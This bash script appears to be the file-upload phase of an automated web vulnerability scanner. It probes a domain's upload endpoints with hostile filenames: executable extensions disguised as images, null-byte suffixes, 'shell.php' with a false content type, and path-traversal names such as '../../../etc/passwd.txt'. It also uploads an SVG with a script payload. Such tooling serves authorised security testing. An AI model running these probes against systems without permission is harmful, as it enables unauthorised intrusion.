#!/bin/bash
# File upload testing harness, extension bypass, content-type confusion, path traversal via upload

file_upload_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local upload_dir="$output_dir/file_upload"
    local crawl_file="$output_dir/crawl/endpoints.txt"
    local live_file="$output_dir/live/live_subdomains.txt"

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true
    mkdir -p "$upload_dir"

    log "INFO" "Starting file upload testing for $domain"
    py_log "INFO" "file_upload_phase started" --phase "file_upload" --target "$domain" || true

    local upload_vulns="$upload_dir/upload_vulns.txt"
    local upload_endpoints="$upload_dir/upload_endpoints.txt"
    touch "$upload_vulns" "$upload_endpoints"

    # ------------------------------------------------------------------
    # 1. Discover upload endpoints
    # ------------------------------------------------------------------
    if [ -f "$crawl_file" ] && command -v grep >/dev/null 2>&1; then
        log "INFO" "Discovering file upload endpoints..."
        grep -iE "(upload|file|image|document|attachment|media|asset|import|multipart)" "$crawl_file" 2>/dev/null \
            | sort -u > "$upload_endpoints" || true
    fi

    if [ -f "$live_file" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Probing common upload paths..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            for up_path in /upload /api/upload /file/upload /api/file/upload /admin/upload /media/upload /images/upload /attachments/upload; do
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${host%/}${up_path}" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|405|400|403)$"; then
                    echo "${host%/}${up_path}" >> "$upload_endpoints"
                fi
            done
        done < <(head -20 "$live_file")
        sort -u "$upload_endpoints" -o "$upload_endpoints" 2>/dev/null || true
    fi

    if [ ! -s "$upload_endpoints" ]; then
        log "WARN" "No upload endpoints found, skipping file upload testing"
        echo "0" > "$upload_dir/count.txt"
        return 0
    fi

    # ------------------------------------------------------------------
    # 2. Extension bypass testing
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing extension bypass techniques..."
        local test_file="$upload_dir/test_benign.txt"
        echo "upload test" > "$test_file" 2>/dev/null || true

        local extensions
        extensions="php phtml php5 php7 pht asp aspx jsp jspjspx cfm cgi pl py rb sh"
        local suffixes
        suffixes=".jpg .png .gif .jpeg .svg %00.jpg %00.png .php.jpg .php.png"

        while IFS= read -r up_url; do
            [ -z "$up_url" ] && continue
            for ext in $extensions; do
                for suffix in $suffixes; do
                    local filename="test${suffix}.${ext}"
                    local code
                    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
                        -F "file=@${test_file};filename=${filename}" \
                        "$up_url" 2>/dev/null) || true
                    if echo "$code" | grep -qE "^(200|201|202)$"; then
                        echo "EXT_BYPASS: $up_url | Filename: $filename | Status: $code" >> "$upload_vulns"
                        write_finding "{\"type\":\"upload_ext_bypass\",\"url\":\"$up_url\",\"filename\":\"$filename\",\"severity\":\"critical\",\"domain\":\"$domain\"}" "$upload_dir/findings.json" || true
                    fi
                done
            done
            # Polyglot test
            local poly_code
            poly_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
                -F "file=@${test_file};filename=polyglot.php.jpg" \
                "$up_url" 2>/dev/null) || true
            if echo "$poly_code" | grep -qE "^(200|201)$"; then
                echo "POLYGLOT_UPLOAD: $up_url | Status: $poly_code" >> "$upload_vulns"
            fi
        done < <(head -15 "$upload_endpoints")
    fi

    # ------------------------------------------------------------------
    # 3. Content-Type confusion testing
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing content-type confusion..."
        local test_file="$upload_dir/test_benign.txt"
        echo "upload test" > "$test_file" 2>/dev/null || true

        while IFS= read -r up_url; do
            [ -z "$up_url" ] && continue
            # Send PHP file with image content-type
            local code
            code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
                -F "file=@${test_file};filename=shell.php;type=image/png" \
                "$up_url" 2>/dev/null) || true
            if echo "$code" | grep -qE "^(200|201)$"; then
                echo "CONTENT_TYPE_CONFUSION: $up_url | PHP file with image content-type accepted | Status: $code" >> "$upload_vulns"
                write_finding "{\"type\":\"upload_content_type_confusion\",\"url\":\"$up_url\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$upload_dir/findings.json" || true
            fi
            # Send shell file with text/plain
            local code2
            code2=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
                -F "file=@${test_file};filename=shell.jsp;type=text/plain" \
                "$up_url" 2>/dev/null) || true
            if echo "$code2" | grep -qE "^(200|201)$"; then
                echo "CONTENT_TYPE_MISMATCH: $up_url | JSP with text/plain accepted | Status: $code2" >> "$upload_vulns"
            fi
        done < <(head -15 "$upload_endpoints")
    fi

    # ------------------------------------------------------------------
    # 4. Path traversal via upload filename
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing path traversal via upload filename..."
        local test_file="$upload_dir/test_benign.txt"
        echo "upload test" > "$test_file" 2>/dev/null || true

        local traversal_names
        traversal_names="../test.txt ..%2Ftest.txt ....//test.txt %2e%2e%2ftest.txt ..\\test.txt ..%5c%2ftest.txt"
        local double_traversal
        double_traversal="../upload_test.txt ../../../etc/passwd.txt ..%2f..%2f..%2fetc/passwd"

        while IFS= read -r up_url; do
            [ -z "$up_url" ] && continue
            for tname in $traversal_names $double_traversal; do
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
                    -F "file=@${test_file};filename=${tname}" \
                    "$up_url" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|201)$"; then
                    echo "PATH_TRAVERSAL_UPLOAD: $up_url | Filename: $tname | Status: $code" >> "$upload_vulns"
                    write_finding "{\"type\":\"upload_path_traversal\",\"url\":\"$up_url\",\"filename\":\"$tname\",\"severity\":\"critical\",\"domain\":\"$domain\"}" "$upload_dir/findings.json" || true
                fi
            done
        done < <(head -15 "$upload_endpoints")
    fi

    # ------------------------------------------------------------------
    # 5. SVG XSS upload test
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing SVG XSS upload..."
        local svg_payload="$upload_dir/svg_xss.svg"
        echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > "$svg_payload" 2>/dev/null || true

        while IFS= read -r up_url; do
            [ -z "$up_url" ] && continue
            local code
            code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
                -F "file=@${svg_payload};filename=xss.svg;type=image/svg+xml" \
                "$up_url" 2>/dev/null) || true
            if echo "$code" | grep -qE "^(200|201)$"; then
                echo "SVG_XSS_UPLOAD: $up_url | SVG with script uploaded | Status: $code" >> "$upload_vulns"
                write_finding "{\"type\":\"upload_svg_xss\",\"url\":\"$up_url\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$upload_dir/findings.json" || true
            fi
        done < <(head -15 "$upload_endpoints")
    fi

    # ------------------------------------------------------------------
    # 6. Summary count
    # ------------------------------------------------------------------
    local vuln_count
    vuln_count=$(wc -l < "$upload_vulns" 2>/dev/null || echo 0)
    log "INFO" "File upload testing complete: $vuln_count issues found"

    py_log "INFO" "file_upload_phase complete" --phase "file_upload" --target "$domain" --extra "{\"vulns\":$vuln_count}" || true
    echo "$vuln_count" > "$upload_dir/count.txt"
}

export -f file_upload_phase
